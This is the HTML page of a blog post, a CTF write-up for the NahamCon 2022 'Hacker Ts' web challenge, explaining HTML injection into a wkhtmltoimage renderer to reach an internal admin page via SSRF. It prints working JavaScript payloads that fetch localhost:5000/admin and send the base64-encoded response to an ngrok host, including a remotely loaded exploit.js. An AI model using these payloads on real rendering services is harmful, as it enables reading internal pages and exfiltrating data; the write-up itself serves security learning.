@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Hacker Ts challenge writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to docuemnt it in this writeup
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Hacker Ts challenge writeup">
+    <meta name="twitter:description" content="Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to docuemnt it in this writeup
+">
+    <meta name="twitter:image" content="/media/CTFs/Flag.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Hacker Ts challenge writeup">
+  <meta property="og:description" content="Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to docuemnt it in this writeup
+">
+  <meta property="og:url" content="/post/hacker-ts/">
+  <meta property="og:image" content="/media/CTFs/Flag.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/hacker-ts/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/test.jpg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//medium.com/@mesbaha" rel="me" title="Medium" aria-label="Medium">
+            <span class="icon icon-medium" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Hacker Ts challenge writeup</h1>
+      <p class="post-meta">@0xMesbaha · May 2, 2022 · 2 min read</p>
+    </header>
+    <article class="post-content"><p>Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to docuemnt it in this writeup</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CTF name</td>
+<td><a href="https://www.nahamcon.com/">NahamconCTF 2022</a></td>
+</tr>
+<tr>
+<td>challenge</td>
+<td>Hacker Ts</td>
+</tr>
+<tr>
+<td>category</td>
+<td>web</td>
+</tr>
+<tr>
+<td>about</td>
+<td>HTML injection</td>
+</tr>
+<tr>
+<td>team</td>
+<td><a href="https://ctftime.org/team/168238">0xCha0s</a></td>
+</tr>
+</tbody>
+</table>
+<p>we are introduced with this page , it can take a text as input and we can also specify the color</p>
+<p><img src="/media/CTFs/Hacker-Ts/20220430232105.png" alt="error"></p>
+<ul>
+<li>and the output is :</li>
+</ul>
+<p><img src="/media/CTFs/Hacker-Ts/20220430232158.png" alt="error"></p>
+<ul>
+<li>Also we can see the <strong>Admin</strong> tab above it shows the following :</li>
+</ul>
+<p><img src="/media/CTFs/Hacker-Ts/20220430232228.png" alt="error"></p>
+<ul>
+<li>
+<p>So our goal is to view the admin page , mentioning the <code>localhost:5000</code> should trigger you for SSRF most likely.</p>
+</li>
+<li>
+<p>We can try to inject html code and see if it gets rendered <code>&lt;h1&gt;test&lt;/h1&gt;</code></p>
+</li>
+</ul>
+<p><img src="/media/CTFs/Hacker-Ts/20220430232530.png" alt="error"></p>
+<ul>
+<li>and it worked indeed , we can try to execute some JS , start with <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> But it shows empty t-shirt</li>
+<li>we can try :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>&gt;aa&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;test&#39;</span>).<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">+=</span>window.<span style="color:#a6e22e">location</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p><img src="/media/CTFs/Hacker-Ts/20220430233020.png" alt="error"></p>
+<ul>
+<li>we can try to trigger an error while processing to get more information with replacing <code>test</code> with <code>X</code></li>
+</ul>
+<p><img src="/media/CTFs/Hacker-Ts/20220430233123.png" alt="error"></p>
+<ul>
+<li>
+<p>we got this error , we know it uses <code>wkhtmltoimage</code> to make the process , searching for it found the following articles :</p>
+</li>
+<li>
+<p><a href="https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent">Nahmasec</a></p>
+</li>
+<li>
+<p><a href="https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f">here</a></p>
+</li>
+<li>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">Hacktricks</a></p>
+</li>
+<li>
+<p>we can craft payloads to make it visit the admin page and view the response for us :</p>
+</li>
+</ul>
+<h2 id="approach-1">Approach 1</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">0xMesbaha</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://localhost:5000/admin&#34;</span>,<span style="color:#66d9ef">false</span>);
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;0xMesbaha&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>;
+&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>the false in <code>xhr.open </code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">async parameter which is optional , If this value is false, the send<span style="color:#f92672">()</span> method does not <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">until</span> the response is received.
+</code></pre></div><p><img src="/media/CTFs/Hacker-Ts/20220430234539.png" alt="error"></p>
+<h2 id="approach-2">Approach 2</h2>
+<ul>
+<li>we can also use other payload to take the response then send it to remote server :</li>
+<li>in the text input :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://localhost:5000/admin&#34;</span>);
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">exfil</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://ee3f-156-194-180-190.ngrok.io/?flag=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag</span>);
+    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">send</span>();
+};
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p><img src="/media/CTFs/Hacker-Ts/20220430235147.png" alt="error"></p>
+<ul>
+<li>decode it :</li>
+</ul>
+<p><img src="/media/CTFs/Hacker-Ts/20220430235227.png" alt="error"></p>
+<h2 id="approach-3">Approach 3</h2>
+<ul>
+<li>we can also go to another approach , which is hosting <code>exploit.js</code> contains :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://localhost:5000/admin&#34;</span>);
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">exfil</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;http://6ce0-156-194-180-190.ngrok.io/?flag=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag</span>);
+    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">send</span>();
+};
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+</code></pre></div><ul>
+<li>then on the text input use :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://6ce0-156-194-180-190.ngrok.io/exploit.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><ul>
+<li>same output :</li>
+</ul>
+<p><img src="/media/CTFs/Hacker-Ts/20220430235602.png" alt="error"></p></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/html-injection"><span class="tag">Html Injection</span></a></li>
+        
+          <li><a href="/tags/ssrf"><span class="tag">SSRF</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
